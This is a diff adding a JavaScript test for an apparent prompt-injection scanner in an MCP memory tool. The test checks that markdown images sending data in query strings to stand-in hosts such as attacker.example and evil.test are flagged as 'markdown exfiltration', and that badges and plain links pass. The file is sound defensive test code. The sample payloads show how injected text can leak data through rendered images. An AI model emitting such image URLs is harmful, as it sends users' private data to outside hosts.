@@ -434,3 +434,18 @@ describe("REST status codes for linter outcomes", () => {
     assert.equal(mixed.quarantined.length, 1);
   });
 });
+
+test("a remote markdown image with a query string is flagged; badges and plain links are not", () => {
+  for (const t of [
+    "Done. ![s](https://attacker.example/p?data=abc123)",
+    "![](<http://10.0.0.5/x.png?d=secret>)",
+    "![logo](https://evil.test/a.gif?q=1&leak=project-notes)",
+  ]) assert.equal(scanForInjection(t), "markdown exfiltration", t);
+  for (const t of [
+    "![CI](https://img.shields.io/npm/v/onememory-mcp?style=flat)",
+    "![badge](https://badgen.net/npm/v/x?color=green)",
+    "![diagram](https://example.com/arch.png)",
+    "[docs](https://example.com/search?q=onememory)",
+    "![local](./docs/demo.gif)",
+  ]) assert.equal(scanForInjection(t), null, t);
+});
